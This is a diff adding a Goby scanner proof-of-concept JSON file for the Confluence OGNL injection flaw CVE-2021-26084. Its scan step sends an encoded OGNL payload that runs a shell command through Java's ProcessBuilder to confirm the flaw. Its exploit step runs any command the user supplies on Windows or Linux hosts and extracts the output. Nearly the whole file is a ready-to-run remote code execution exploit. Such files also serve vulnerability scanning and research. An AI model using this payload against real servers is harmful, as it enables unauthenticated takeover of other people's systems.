@@ -1,0 +1,82 @@
+{
+      "Name": "Confluence RCE(CVE-2021-26084)",
+      "Level": "3",
+      "Tags": [
+            "RCE"
+      ],
+      "GobyQuery": "product=\"Confluence\"",
+      "Description": "In affected versions of Confluence Server and Data Center, an OGNL injection vulnerability exists that would allow an unauthenticated attacker to execute arbitrary code on a Confluence Server or Data Center instance. The affected versions are before version 6.13.23, from version 6.14.0 before 7.4.11, from version 7.5.0 before 7.11.6, and from version 7.12.0 before 7.12.5.",
+      "Product": "Atlassian Confluence",
+      "Homepage": "https://www.atlassian.com/zh/software/confluence",
+      "Author": "aetkrad",
+      "Impact": "<p>allow an unauthenticated attacker to execute arbitrary code on a Confluence Server or Data Center instance<br></p>",
+      "Recommandation": "",
+      "References": [
+            "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-26084"
+      ],
+      "HasExp":true,
+      "ExpParams":[
+      {
+            "name":"cmd",
+            "type":"input",
+            "value":"whoami",
+            "show":""
+      }
+      ],
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/pages/doenterpagevariables.action",
+                        "follow_redirect": false,
+                        "header": {
+                              "Content-Type": "application/x-www-form-urlencoded"
+                        },
+                        "data_type": "text",
+                        "data": "queryString=\\u0027%2b#{\\u0022\\u0022[\\u0022class\\u0022].forName(\\u0022javax.script.ScriptEngineManager\\u0022).newInstance().getEngineByName(\\u0022js\\u0022).eval(\\u0022var isWin=java.lang.System.getProperty(\\u0027os.name\\u0027).toLowerCase().contains(\\u0027win\\u0027);var p=new java.lang.ProcessBuilder;if(isWin){p.command([\\u0027cmd.exe\\u0027,\\u0027/c\\u0027,\\u0027echo workwork\\u0027]);}else{p.command([\\u0027/bin/bash\\u0027,\\u0027-c\\u0027,\\u0027echo workwork\\u0027]);}p.redirectErrorStream(true);var pc=p.start();org.apache.commons.io.IOUtils.toString(pc.getInputStream())\\u0022)}%2b\\u0027"
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "workwork",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "ExploitSteps":[
+            "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/pages/doenterpagevariables.action",
+                        "follow_redirect": false,
+                        "header": {
+                              "Content-Type": "application/x-www-form-urlencoded"
+                        },
+                        "data_type": "text",
+                        "data": "queryString=\\u0027%2b#{\\u0022\\u0022[\\u0022class\\u0022].forName(\\u0022javax.script.ScriptEngineManager\\u0022).newInstance().getEngineByName(\\u0022js\\u0022).eval(\\u0022var isWin=java.lang.System.getProperty(\\u0027os.name\\u0027).toLowerCase().contains(\\u0027win\\u0027);var p=new java.lang.ProcessBuilder;if(isWin){p.command([\\u0027cmd.exe\\u0027,\\u0027/c\\u0027,\\u0027{{{cmd}}}\\u0027]);}else{p.command([\\u0027/bin/bash\\u0027,\\u0027-c\\u0027,\\u0027{{{cmd}}}\\u0027]);}p.redirectErrorStream(true);var pc=p.start();org.apache.commons.io.IOUtils.toString(pc.getInputStream())\\u0022)}%2b\\u0027"
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|value=\"{([\\s\\S]*)=null}\""
+                  ]
+            }
+      ],
+      "PostTime": "2021-10-27 13:33:02",
+      "GobyVersion": "1.8.294"
+}
